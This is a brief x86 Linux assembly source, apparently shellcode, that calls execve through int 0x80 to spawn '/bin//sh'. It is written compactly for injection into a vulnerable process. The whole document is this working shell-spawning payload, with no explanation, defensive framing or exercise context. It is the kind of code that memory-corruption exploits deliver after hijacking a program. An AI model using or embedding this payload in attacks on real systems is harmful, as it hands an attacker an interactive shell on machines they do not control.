global _start
section .text


_start:

push byte +0xb
pop eax
cdq
push edx
push dword 0x68732f2f
push dword 0x6e69622f
mov ebx,esp
xor ecx,ecx
int 0x80

